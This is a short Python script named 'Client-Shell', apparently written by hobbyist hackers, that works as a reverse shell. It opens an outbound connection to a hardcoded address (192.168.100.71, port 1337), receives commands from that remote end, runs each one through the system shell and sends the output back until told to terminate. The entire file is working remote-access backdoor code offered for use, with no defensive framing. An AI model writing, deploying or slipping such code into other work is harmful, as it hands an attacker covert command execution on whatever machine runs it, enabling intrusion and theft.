#!/usr/bin/python
# Client-Shell
# Author: N4N0-GH05TL1N3 && H2O

import socket #import socket
import subprocess #to start shell in the system

def connect() :
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("192.168.100.71", 1337))

	while True : #keep recv command
		command = sock.recv(1024)

		if 'terminate' in command :
			sock.close() #close() socket
			break
		else :
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			
			sock.send(CMD.stdout.read())
			sock.send(CMD.stderr.read())

def main() :
	connect()

main()
